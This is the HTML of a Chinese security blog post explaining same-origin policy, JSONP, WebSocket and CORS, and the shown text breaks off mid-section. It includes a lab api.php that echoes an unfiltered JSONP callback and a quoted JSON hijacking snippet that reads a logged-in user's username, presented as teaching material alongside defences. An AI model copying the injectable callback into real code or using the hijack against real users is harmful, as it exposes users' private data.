@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicons/favicon-16x16.png">
+  <link rel="mask-icon" href="/image/favicons/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"paoka1.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="同源策略和域安全相关问题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="同源策略和域安全">
+<meta property="og:url" content="https://paoka1.top/2022/09/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Paoka1&#39;s Blog">
+<meta property="og:description" content="同源策略和域安全相关问题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/09/jsonp.jpg">
+<meta property="article:published_time" content="2022-09-10T04:19:18.000Z">
+<meta property="article:modified_time" content="2026-01-04T12:35:21.279Z">
+<meta property="article:author" content="Paoka1">
+<meta property="article:tag" content="CORS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JSONP">
+<meta property="article:tag" content="WebSocket">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://paoka1.top/image/post/2022/09/jsonp.jpg">
+
+
+<link rel="canonical" href="https://paoka1.top/2022/09/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://paoka1.top/2022/09/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/","path":"2022/09/10/同源策略和域安全/","title":"同源策略和域安全"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>同源策略和域安全 | Paoka1's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Paoka1's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%84%E9%81%BF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">2.</span> <span class="nav-text">规避同源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP-%E8%AF%A6%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">JSONP 详解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP-%E7%9A%84%E5%8A%AB%E6%8C%81%E9%98%B2%E8%8C%83"><span class="nav-number">4.</span> <span class="nav-text">JSONP 的劫持防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebSocket-%E7%AE%80%E4%BB%8B"><span class="nav-number">5.</span> <span class="nav-text">WebSocket 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CORS-%E8%AF%A6%E8%A7%A3"><span class="nav-number">6.</span> <span class="nav-text">CORS 详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82"><span class="nav-number">6.1.</span> <span class="nav-text">简单请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82"><span class="nav-number">6.2.</span> <span class="nav-text">非简单请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8E-JSONP-%E7%9A%84%E6%AF%94%E8%BE%83"><span class="nav-number">6.3.</span> <span class="nav-text">与 JSONP 的比较</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-%E7%AE%80%E4%BB%8B"><span class="nav-number">7.</span> <span class="nav-text">CSP 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">CSP 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#URL%E8%B7%B3%E8%BD%AC"><span class="nav-number">8.1.</span> <span class="nav-text">URL跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#link%E6%A0%87%E7%AD%BE%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="nav-number">8.2.</span> <span class="nav-text">link标签预加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8"><span class="nav-number">8.3.</span> <span class="nav-text">利用浏览器补全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8"><span class="nav-number">8.4.</span> <span class="nav-text">代码重用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ifrmae"><span class="nav-number">8.5.</span> <span class="nav-text">ifrmae</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#meta%E6%A0%87%E7%AD%BE"><span class="nav-number">8.6.</span> <span class="nav-text">meta标签</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paoka1"
+      src="/image/favicons/favicon.ico">
+  <p class="site-author-name" itemprop="name">Paoka1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/paoka1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;paoka1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shauio@163.com" title="E-Mail → mailto:shauio@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://paoka1.top/2022/09/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/favicons/favicon.ico">
+      <meta itemprop="name" content="Paoka1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="同源策略和域安全 | Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          同源策略和域安全
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-09-10 12:19:18" itemprop="dateCreated datePublished" datetime="2022-09-10T12:19:18+08:00">2022-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-04 20:35:21" itemprop="dateModified" datetime="2026-01-04T20:35:21+08:00">2026-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">安全相关</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>同源策略和域安全相关问题</p>
+<center><img src="/image/post/2022/09/jsonp.jpg"></center>
+
+<span id="more"></span>
+
+<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略是目前所有浏览器都实行的一种安全政策，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页同源，所谓同源，是指：<strong>两个网页，协议（protocol）、端口（port）、和主机（host）都相同</strong></p>
+<p>如果非同源，以下三种行为受到限制：</p>
+<ol>
+<li><p><strong>Cookie，LocalStorage，IndexDB 无法读取</strong></p>
+<blockquote>
+<p>LocalStorage 是 HTML5 本地存储 Web Storage 特性的 API 之一，用于将大量数据（最大 5 M）保存在浏览器中，保存后数据永远存在不会失效过期，除非用 Js 手动清除，它不参与网络传输，一般用于性能优化，可以保存图片、Js、CSS、HTML 模板、大量数据，IndexDB 也是用于储存的东西</p>
+</blockquote>
+</li>
+<li><p><strong>DOM 无法获取</strong></p>
+<blockquote>
+<p>DOM（Document Object Model）译为文档对象模型，是 HTML 和 XML 文档的编程接口，HTML DOM 定义了访问和操作 HTML 文档的标准方法，DOM 以树结构表达 HTML 文档</p>
+</blockquote>
+</li>
+<li><p><strong>AJAX 请求不能发送</strong></p>
+<blockquote>
+<p>AJAX &#x3D; Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。 AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容，<strong>AJAX 请求只能发给同源的网址</strong></p>
+</blockquote>
+</li>
+</ol>
+<p>下表给出了与 URL<code>http://store.company.com/dir/page.html</code>的源进行对比的示例（同源策略认为域和子域属于不同的域）：</p>
+<table>
+<thead>
+<tr>
+<th align="left">URL</th>
+<th align="left">结果</th>
+<th align="left">原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>http://store.company.com/dir2/other.html</code></td>
+<td align="left">同源</td>
+<td align="left">只有路径不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://store.company.com/dir/inner/another.html</code></td>
+<td align="left">同源</td>
+<td align="left">只有路径不同</td>
+</tr>
+<tr>
+<td align="left"><code>https://store.company.com/secure.html</code></td>
+<td align="left">失败</td>
+<td align="left">协议不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://store.company.com:81/dir/etc.html</code></td>
+<td align="left">失败</td>
+<td align="left">端口不同</td>
+</tr>
+<tr>
+<td align="left"><code>http://news.company.com/dir/other.html</code></td>
+<td align="left">失败</td>
+<td align="left">主机不同</td>
+</tr>
+</tbody></table>
+<p><code>a.com</code>和<code>child.a.com</code>不同源，针对这种情况，可以在两方面设置<code>document.domain = &#39;a.com&#39;</code>来实现同源（详见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/huzhenv5/article/details/104884760#documentdomain_7">DOM跨域的三种解决方案：document.domain、window.name、window.postMessage</a>）</p>
+<h3 id="规避同源策略"><a href="#规避同源策略" class="headerlink" title="规避同源策略"></a>规避同源策略</h3><p>主要有以下三种方法规避同源策略的限制：JSONP，WebSocket，CORS</p>
+<ol>
+<li><p><strong>JSONP</strong></p>
+<p>JSONP 就是利用<code>&lt;script&gt;</code>标签的跨域能力实现跨域数据的访问，请求动态生成的 Js 脚本同时带一个 Callback 函数名作为参数</p>
+<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 Callback 函数</p>
+<p>JSONP 也存在一些安全问题，例如当对传入或传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露</p>
+<p>另外 JSONP 在没有设置 Callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击</p>
+</li>
+<li><p><strong>WebScoket</strong></p>
+<p><code>WebSocket</code>是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前，该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信，<code>WebSocket</code>请求的头信息中有一个字段是<code>Origin</code>，表示该请求的请求源（Origin），即发自哪个域名，正是因为有了<code>Origin</code>这个字段，所以<code>WebSocket</code>才没有实行同源政策，因为服务器可以根据这个字段，判断是否许可本次通信</p>
+</li>
+<li><p><strong>CORS</strong></p>
+<p>CORS 是跨域资源共享（Cross-Origin Resource Sharing）的缩写，它允许浏览器向跨源服务器，发出<code>XMLHttpRequest（opens new window）</code>请求，从而克服了 AJAX 只能同源（opens new window）使用的限制，它是<code>W3C</code>标准，是跨源 AJAX 请求的根本解决方法。<code>CORS</code>请求大致和<code>Ajax</code>请求类似，但是在 HTTP 头信息中加上了 Origin 字段表明请求来自哪个源，如果<code>Orgin</code>是许可范围之内的话，服务器返回的响应会多出<code>Access-Control-Allow-*</code>的字段</p>
+</li>
+</ol>
+<h3 id="JSONP-详解"><a href="#JSONP-详解" class="headerlink" title="JSONP 详解"></a>JSONP 详解</h3><p><code>JSONP</code>是服务器与客户端跨源通信的常用方法，<code>JSON with Padding</code>，填充式<code>JSON</code>或者说是参数式<code>JSON</code>，<code>JSONP</code>原理就是动态插入带有<code>跨域 url</code>的<code>&lt;script&gt;</code>标签，然后调用回调函数</p>
+<p><strong><code>JSONP</code>由两部分组成：回调函数和里面的数据。</strong> 回调函数是当响应到来时，应该在页面中调用的函数，一般是在发送过去的请求中指定，向服务器请求<code>JSON</code>数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来</p>
+<p>使用 JSONP 的实例：这里创建两个网站（使用 PHPStudy，一个为<code>www.learnjs.com</code>，另一个为<code>www.ctftest.com</code>），现在模拟跨域请求，<code>www.learnjs.com</code>会向<code>www.ctftest.com</code>发起请求，把下面的文件放到<code>www.learnjs.com</code>的<code>jsonp</code>目录下</p>
+<p><code>index.html</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>JSONP Here!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;your-ip&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jsonp.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>jsonp.js</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addScriptTag</span>(<span class="params">src</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    script.<span class="title function_">setAttribute</span>(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text/javascript&quot;</span>);</span><br><span class="line">    script.<span class="property">src</span> = src;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">addScriptTag</span>(<span class="string">&#x27;http://ctftest.com/api.php?callback=foo&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ip = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;your-ip&#x27;</span>);</span><br><span class="line">    ip.<span class="property">innerHTML</span> = <span class="string">&quot;ip：&quot;</span> + data.<span class="property">ip</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>www.ctftest.com</code>根目录添加<code>api.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">array</span>(<span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>].<span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$msg</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时访问<code>http://learnjs.com/jsonp/</code>就会发现成功进行了跨域的请求，原理如下：</p>
+<p>依据<code>jsonp.js</code>，在页面加载时，<code>addScriptTag</code>函数在页面里添加元素<code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://ctftest.com/api.php?callback=foo&quot;&gt;&lt;/script&gt;</code>，由于历史原因<code>&lt;script&gt;</code>标签没有跨域限制，于是成功跨域请求，而服务器收到这个请求以后，会将数据放在回调函数的参数位置返回：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">foo</span>(&#123;<span class="string">&quot;ip&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行，这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用，作为参数的<code>JSON</code>数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤，可以参考：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/19966531">JSONP 的工作原理是什么？</a>，JSONP 的缺点也很明显，只能进行 GET 请求</p>
+<h3 id="JSONP-的劫持防范"><a href="#JSONP-的劫持防范" class="headerlink" title="JSONP 的劫持防范"></a>JSONP 的劫持防范</h3><p><code>JSON</code>劫持又为<code>JSON Hijacking</code> ，这个问题属于<code>CSRF</code>攻击范畴。 当某网站通过<code>JSONP</code>的方式来跨域（一般为子域）传递用户认证后的敏感信息时攻击者可以构造恶意的<code>JSONP</code>调用页面，诱导被攻击者访问，来达到截取用户敏感信息的目的，一个典型的<code>JSON Hijacking</code>攻击代码（<code>wooyun</code>）：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">wooyun</span>(<span class="params">v</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(v.<span class="property">username</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http:/xx.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>当被攻击者在登陆某网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持，防范方法如下：</p>
+<ol>
+<li><p><strong>验证<code>JSON</code>文件调用的来源<code>Referer</code></strong></p>
+<p><code>&lt;script&gt;</code>远程加载 JSON 文件时会发送 Referer，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的，就可以进行防御</p>
+</li>
+<li><p><strong>随机 token</strong></p>
+<p>存在 reference 伪造（qq.com.evil.com）、空 reference、暴力穷举等问题（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/subsir/articles/2574670.html">强大的PHP伪造IP头、Cookies、Reference</a>），最有效的方式还是综合防御（判断 reference 和添加随机字串），或使用加在<code>url</code>中的 token 可以完美解决 但是只要在该网站上出现一个<code>XSS</code>漏洞，那么利用这个<code>XSS</code>漏洞可能让防御体系瞬间崩溃</p>
+</li>
+<li><p><strong><code>callback</code>函数可定义的安全问题</strong></p>
+<p>callback 函数的名称可以自定义，而输出环境又是<code>js</code>环境，如果没有严格过滤或审查，可以引起很多其他的攻击方式，比如后台如果使用这类代码：</p>
